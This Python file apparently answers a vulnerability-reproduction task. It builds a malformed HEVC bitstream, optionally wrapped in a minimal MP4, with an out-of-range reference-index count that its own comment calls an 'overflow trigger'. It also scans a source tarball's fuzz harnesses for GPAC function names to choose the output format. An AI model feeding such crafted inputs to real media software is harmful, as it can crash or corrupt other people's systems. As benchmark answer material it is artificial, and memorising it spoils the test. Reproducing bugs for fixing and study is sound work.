import os
import tarfile
import struct
from typing import Optional


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bits(self, value: int, n: int) -> None:
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            bit = (value >> i) & 1
            self._cur = (self._cur << 1) | bit
            self._nbits += 1
            if self._nbits == 8:
                self._buf.append(self._cur & 0xFF)
                self._cur = 0
                self._nbits = 0

    def write_bit(self, bit: int) -> None:
        self.write_bits(1 if bit else 0, 1)

    def write_ue(self, v: int) -> None:
        if v < 0:
            v = 0
        code_num = v + 1
        n = code_num.bit_length()
        leading_zeros = n - 1
        if leading_zeros:
            self.write_bits(0, leading_zeros)
        self.write_bits(code_num, n)

    def write_se(self, v: int) -> None:
        if v <= 0:
            code_num = (-v) * 2
        else:
            code_num = v * 2 - 1
        self.write_ue(code_num)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        if self._nbits:
            self.write_bits(0, 8 - self._nbits)

    def get_bytes(self) -> bytes:
        if self._nbits:
            self._buf.append((self._cur << (8 - self._nbits)) & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _ebsp_from_rbsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zeros = 0
    for b in rbsp:
        if zeros == 2 and b <= 3:
            out.append(3)
            zeros = 0
        out.append(b)
        if b == 0:
            zeros += 1
        else:
            zeros = 0
    return bytes(out)


def _make_nal(nal_unit_type: int, rbsp: bytes, layer_id: int = 0, temporal_id_plus1: int = 1) -> bytes:
    if temporal_id_plus1 <= 0:
        temporal_id_plus1 = 1
    if layer_id < 0:
        layer_id = 0
    if layer_id > 63:
        layer_id = 63
    b0 = ((nal_unit_type & 0x3F) << 1) | ((layer_id >> 5) & 0x01)
    b1 = ((layer_id & 0x1F) << 3) | (temporal_id_plus1 & 0x07)
    ebsp = _ebsp_from_rbsp(rbsp)
    return bytes((b0, b1)) + ebsp


def _write_profile_tier_level_minimal(bw: _BitWriter) -> None:
    bw.write_bits(0, 2)  # general_profile_space
    bw.write_bit(0)      # general_tier_flag
    bw.write_bits(1, 5)  # general_profile_idc
    bw.write_bits(0, 32)  # general_profile_compatibility_flags
    bw.write_bits(0, 48)  # general_constraint_indicator_flags
    bw.write_bits(90, 8)  # general_level_idc (level 3.0-ish)


def _build_vps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # vps_video_parameter_set_id
    bw.write_bit(1)      # vps_base_layer_internal_flag
    bw.write_bit(1)      # vps_base_layer_available_flag
    bw.write_bits(0, 6)  # vps_max_layers_minus1
    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
    bw.write_bit(1)      # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # reserved
    _write_profile_tier_level_minimal(bw)
    bw.write_bit(0)  # vps_sub_layer_ordering_info_present_flag
    bw.write_ue(0)   # vps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)   # vps_max_num_reorder_pics[0]
    bw.write_ue(0)   # vps_max_latency_increase_plus1[0]
    bw.write_bits(0, 6)  # vps_max_layer_id
    bw.write_ue(0)       # vps_num_layer_sets_minus1
    bw.write_bit(0)      # vps_timing_info_present_flag
    bw.write_bit(0)      # vps_extension_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_sps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # sps_video_parameter_set_id
    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
    bw.write_bit(1)      # sps_temporal_id_nesting_flag
    _write_profile_tier_level_minimal(bw)
    bw.write_ue(0)  # sps_seq_parameter_set_id
    bw.write_ue(1)  # chroma_format_idc (4:2:0)
    bw.write_ue(16)  # pic_width_in_luma_samples
    bw.write_ue(16)  # pic_height_in_luma_samples
    bw.write_bit(0)  # conformance_window_flag
    bw.write_ue(0)  # bit_depth_luma_minus8
    bw.write_ue(0)  # bit_depth_chroma_minus8
    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)
    bw.write_bit(0)  # sps_sub_layer_ordering_info_present_flag
    bw.write_ue(4)  # sps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)  # sps_max_num_reorder_pics[0]
    bw.write_ue(0)  # sps_max_latency_increase_plus1[0]
    bw.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)  # max_transform_hierarchy_depth_inter
    bw.write_ue(0)  # max_transform_hierarchy_depth_intra
    bw.write_bit(0)  # scaling_list_enabled_flag
    bw.write_bit(0)  # amp_enabled_flag
    bw.write_bit(0)  # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)  # pcm_enabled_flag
    bw.write_ue(1)  # num_short_term_ref_pic_sets

    # st_ref_pic_set(0): one negative ref at -1
    bw.write_bit(0)  # inter_ref_pic_set_prediction_flag
    bw.write_ue(1)   # num_negative_pics
    bw.write_ue(0)   # num_positive_pics
    bw.write_ue(0)   # delta_poc_s0_minus1[0] => -1
    bw.write_bit(1)  # used_by_curr_pic_s0_flag[0]

    bw.write_bit(0)  # long_term_ref_pics_present_flag
    bw.write_bit(0)  # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)  # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)  # vui_parameters_present_flag
    bw.write_bit(0)  # sps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_pps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)  # pps_pic_parameter_set_id
    bw.write_ue(0)  # pps_seq_parameter_set_id
    bw.write_bit(0)  # dependent_slice_segments_enabled_flag
    bw.write_bit(0)  # output_flag_present_flag
    bw.write_bits(0, 3)  # num_extra_slice_header_bits
    bw.write_bit(0)  # sign_data_hiding_enabled_flag
    bw.write_bit(0)  # cabac_init_present_flag
    bw.write_ue(0)  # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)  # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)  # init_qp_minus26
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # transform_skip_enabled_flag
    bw.write_bit(0)  # cu_qp_delta_enabled_flag
    bw.write_se(0)  # pps_cb_qp_offset
    bw.write_se(0)  # pps_cr_qp_offset
    bw.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bit(0)  # weighted_bipred_flag
    bw.write_bit(0)  # transquant_bypass_enabled_flag
    bw.write_bit(0)  # tiles_enabled_flag
    bw.write_bit(0)  # entropy_coding_sync_enabled_flag
    bw.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)  # deblocking_filter_control_present_flag
    bw.write_bit(0)  # pps_scaling_list_data_present_flag
    bw.write_bit(0)  # lists_modification_present_flag
    bw.write_ue(0)  # log2_parallel_merge_level_minus2
    bw.write_bit(0)  # slice_segment_header_extension_present_flag
    bw.write_bit(0)  # pps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_idr_slice_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_bit(0)  # no_output_of_prior_pics_flag (IDR)
    bw.write_ue(0)   # slice_pic_parameter_set_id
    bw.write_ue(2)   # slice_type = I
    bw.write_se(0)   # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_p_slice_rbsp(num_ref_idx_l0_active_minus1: int = 16) -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_ue(0)   # slice_pic_parameter_set_id
    bw.write_ue(1)   # slice_type = P
    bw.write_bits(1, 4)  # slice_pic_order_cnt_lsb (4 bits)
    bw.write_bit(1)  # short_term_ref_pic_set_sps_flag
    # (num_short_term_ref_pic_sets == 1) => no short_term_ref_pic_set_idx
    bw.write_bit(1)  # num_ref_idx_active_override_flag
    bw.write_ue(num_ref_idx_l0_active_minus1)  # num_ref_idx_l0_active_minus1 (overflow trigger)
    bw.write_ue(0)  # five_minus_max_num_merge_cand
    bw.write_se(0)  # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_annexb_hevc_stream() -> bytes:
    vps = _make_nal(32, _build_vps_rbsp())
    sps = _make_nal(33, _build_sps_rbsp())
    pps = _make_nal(34, _build_pps_rbsp())
    idr = _make_nal(19, _build_idr_slice_rbsp())
    psl = _make_nal(1, _build_p_slice_rbsp(16))
    start = b"\x00\x00\x00\x01"
    return start + vps + start + sps + start + pps + start + idr + start + psl


def _mp4_box(typ: bytes, payload: bytes) -> bytes:
    return struct.pack(">I4s", 8 + len(payload), typ) + payload


def _mp4_full_box(typ: bytes, version: int, flags: int, payload: bytes) -> bytes:
    return _mp4_box(typ, struct.pack(">B", version & 0xFF) + struct.pack(">I", flags & 0xFFFFFF)[1:] + payload)


def _lang_code_und() -> int:
    def c(ch: str) -> int:
        v = ord(ch) - 0x60
        if v < 1:
            v = 1
        if v > 26:
            v = 26
        return v
    u, n, d = c("u"), c("n"), c("d")
    return (u << 10) | (n << 5) | d


def _build_hvcc(vps: bytes, sps: bytes, pps: bytes) -> bytes:
    num_temporal_layers = 1
    temporal_id_nested = 1
    length_size_minus_one = 3  # 4-byte lengths

    b = bytearray()
    b.append(1)  # configurationVersion
    b.append(0x01)  # general_profile_space/tier/profile_idc
    b += b"\x00\x00\x00\x00"  # compatibility
    b += b"\x00\x00\x00\x00\x00\x00"  # constraint flags
    b.append(90)  # level_idc
    b += struct.pack(">H", 0xF000)  # min_spatial_segmentation_idc (reserved + 0)
    b.append(0xFC | 0x00)  # parallelismType (reserved + 0)
    b.append(0xFC | 0x01)  # chromaFormat (reserved + 1)
    b.append(0xF8 | 0x00)  # bitDepthLumaMinus8
    b.append(0xF8 | 0x00)  # bitDepthChromaMinus8
    b += b"\x00\x00"  # avgFrameRate
    b.append(((0 & 0x3) << 6) | ((num_temporal_layers & 0x7) << 3) | ((temporal_id_nested & 0x1) << 2) | (length_size_minus_one & 0x3))
    b.append(3)  # numOfArrays

    def add_array(nal_type: int, nal: bytes) -> None:
        b.append(0x80 | (nal_type & 0x3F))  # array_completeness=1, reserved=0
        b += struct.pack(">H", 1)  # numNalus
        b += struct.pack(">H", len(nal))
        b += nal

    add_array(32, vps)
    add_array(33, sps)
    add_array(34, pps)
    return bytes(b)


def _build_min_mp4_with_hevc(sample_nals: list, annexb_extra: bytes) -> bytes:
    # Build NALs for hvcC (VPS/SPS/PPS)
    vps = sample_nals[0]
    sps = sample_nals[1]
    pps = sample_nals[2]

    hvcc = _mp4_box(b"hvcC", _build_hvcc(vps, sps, pps))

    # SampleEntry 'hvc1'
    width = 16
    height = 16
    compressorname = b"\x00" + b"gpac" + b"\x00" * (31 - len(b"gpac"))
    visual = bytearray()
    visual += b"\x00" * 6
    visual += struct.pack(">H", 1)  # data_reference_index
    visual += struct.pack(">H", 0)  # pre_defined
    visual += struct.pack(">H", 0)  # reserved
    visual += struct.pack(">III", 0, 0, 0)  # pre_defined[3]
    visual += struct.pack(">H", width)
    visual += struct.pack(">H", height)
    visual += struct.pack(">I", 0x00480000)  # horizresolution
    visual += struct.pack(">I", 0x00480000)  # vertresolution
    visual += struct.pack(">I", 0)  # reserved
    visual += struct.pack(">H", 1)  # frame_count
    visual += compressorname[:32].ljust(32, b"\x00")
    visual += struct.pack(">H", 0x0018)  # depth
    visual += struct.pack(">H", 0xFFFF)  # pre_defined = -1
    visual += hvcc
    hvc1 = _mp4_box(b"hvc1", bytes(visual))

    stsd = _mp4_full_box(b"stsd", 0, 0, struct.pack(">I", 1) + hvc1)
    stts = _mp4_full_box(b"stts", 0, 0, struct.pack(">I", 1) + struct.pack(">II", 1, 90000))
    stsc = _mp4_full_box(b"stsc", 0, 0, struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1))

    # Sample bytes: 4-byte length prefixes (as per hvcC lengthSizeMinusOne=3)
    sample = bytearray()
    for nal in sample_nals:
        sample += struct.pack(">I", len(nal)) + nal
    sample_bytes = bytes(sample)

    stsz = _mp4_full_box(b"stsz", 0, 0, struct.pack(">II", 0, 1) + struct.pack(">I", len(sample_bytes)))

    # stco will be filled later
    stco_placeholder = _mp4_full_box(b"stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", 0))

    stbl = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco_placeholder)

    url = _mp4_full_box(b"url ", 0, 1, b"")
    dref = _mp4_full_box(b"dref", 0, 0, struct.pack(">I", 1) + url)
    dinf = _mp4_box(b"dinf", dref)
    vmhd = _mp4_full_box(b"vmhd", 0, 1, struct.pack(">HHHH", 0, 0, 0, 0))
    minf = _mp4_box(b"minf", vmhd + dinf + stbl)

    mdhd = _mp4_full_box(
        b"mdhd",
        0,
        0,
        struct.pack(">IIIIHH", 0, 0, 90000, 90000, _lang_code_und(), 0),
    )
    hdlr = _mp4_full_box(b"hdlr", 0, 0, struct.pack(">I4s", 0, b"vide") + b"\x00" * 12 + b"VideoHandler\x00")
    mdia = _mp4_box(b"mdia", mdhd + hdlr + minf)

    tkhd_matrix = struct.pack(
        ">IIIIIIIII",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000
    )
    tkhd = _mp4_full_box(
        b"tkhd",
        0,
        0x000007,
        struct.pack(">IIIIIIHHHH", 0, 0, 1, 0, 1000, 0, 0, 0, 0, 0)
        + tkhd_matrix
        + struct.pack(">II", width << 16, height << 16),
    )
    trak = _mp4_box(b"trak", tkhd + mdia)

    mvhd_matrix = tkhd_matrix
    mvhd = _mp4_full_box(
        b"mvhd",
        0,
        0,
        struct.pack(">IIII", 0, 0, 1000, 1000)
        + struct.pack(">I", 0x00010000)
        + struct.pack(">H", 0x0100)
        + struct.pack(">H", 0)
        + struct.pack(">II", 0, 0)
        + mvhd_matrix
        + struct.pack(">IIIIII", 0, 0, 0, 0, 0, 0)
        + struct.pack(">I", 2),
    )
    moov_without_stco_fix = _mp4_box(b"moov", mvhd + trak)

    ftyp = _mp4_box(b"ftyp", b"isom" + struct.pack(">I", 0x200) + b"isom" + b"iso2" + b"mp41")

    # Build mdat with sample bytes and extra annexb bytes (ignored by MP4, useful for raw scanners)
    mdat_payload = sample_bytes + annexb_extra
    mdat = _mp4_box(b"mdat", mdat_payload)

    # Compute correct chunk offset: file start + ftyp + moov + mdat header
    chunk_offset = len(ftyp) + len(moov_without_stco_fix) + 8

    # Rebuild stco with correct offset and rebuild stbl/minf/... quickly by patching placeholder occurrence
    stco_fixed = _mp4_full_box(b"stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", chunk_offset))

    # Patch by rebuilding the tree (small enough)
    stbl_fixed = _mp4_box(b"stbl", stsd + stts + stsc + stsz + stco_fixed)
    minf_fixed = _mp4_box(b"minf", vmhd + dinf + stbl_fixed)
    mdia_fixed = _mp4_box(b"mdia", mdhd + hdlr + minf_fixed)
    trak_fixed = _mp4_box(b"trak", tkhd + mdia_fixed)
    moov_fixed = _mp4_box(b"moov", mvhd + trak_fixed)

    return ftyp + moov_fixed + mdat


def _detect_input_mode_from_tar(src_path: str) -> str:
    # returns 'mp4' or 'raw'
    try:
        with tarfile.open(src_path, "r:*") as tar:
            fuzzer_blobs = []
            for m in tar.getmembers():
                if not m.isfile():
                    continue
                name = (m.name or "").lower()
                if m.size <= 0 or m.size > 1024 * 1024:
                    continue
                if ("fuzz" not in name) and ("oss-fuzz" not in name) and (not name.endswith((".c", ".cc", ".cpp", ".cxx"))):
                    continue
                try:
                    fp = tar.extractfile(m)
                    if fp is None:
                        continue
                    data = fp.read()
                except Exception:
                    continue
                if b"LLVMFuzzerTestOneInput" in data:
                    fuzzer_blobs.append(data)
                    if len(fuzzer_blobs) >= 5:
                        break

            blob = b"\n".join(fuzzer_blobs) if fuzzer_blobs else b""
            low = blob.lower()

            # Strong signals for MP4/ISOBMFF path
            if (b"gf_isom_open" in low) or (b"gf_isom_open_memory" in low) or (b"gf_isom" in low and b"trak" in low):
                return "mp4"
            if (b"isom" in low and b"moov" in low) or (b"mp4" in low and b"open" in low):
                return "mp4"

            # Strong signals for raw hevc parsing
            if (b"gf_hevc_parse" in low) or (b"hevc" in low and b"nalu" in low) or (b"annexb" in low):
                return "raw"
    except Exception:
        pass
    return "raw"


class Solution:
    def solve(self, src_path: str) -> bytes:
        annexb = _build_annexb_hevc_stream()

        # Build NAL list (without start codes) for mp4 sample: vps,sps,pps,idr,p
        vps = _make_nal(32, _build_vps_rbsp())
        sps = _make_nal(33, _build_sps_rbsp())
        pps = _make_nal(34, _build_pps_rbsp())
        idr = _make_nal(19, _build_idr_slice_rbsp())
        psl = _make_nal(1, _build_p_slice_rbsp(16))
        sample_nals = [vps, sps, pps, idr, psl]

        mode = _detect_input_mode_from_tar(src_path)
        if mode == "mp4":
            return _build_min_mp4_with_hevc(sample_nals, annexb_extra=annexb)
        return annexb